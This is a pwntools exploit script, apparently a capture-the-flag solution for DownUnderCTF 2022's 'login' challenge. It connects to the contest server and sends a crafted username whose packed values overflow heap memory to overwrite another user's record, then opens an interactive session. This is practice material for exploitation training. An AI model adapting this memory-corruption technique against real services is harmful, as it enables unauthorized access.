from pwn import *

HOST = "2022.ductf.dev"
PORT = 30025
file = "./login"
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

command = '''
'''

#io = gdb.debug(file, command)
#io = process(file)
io = remote(HOST, PORT)

def add_user(length: bytes, name: bytes):
    io.sendlineafter("> ", "1")
    io.sendlineafter("length: ", length)
    io.sendlineafter("Username: ", name)

def login(name: bytes):
    io.sendlineafter("> ", "2")
    io.sendlineafter("Username: ", name)

add_user(b"0", b"AAAA" + p64(0)*2 +p64(0x20d50) + p64(0x1337))
add_user(b"7", b"yu1hpa")
login(b"yu1hpa")

io.interactive()
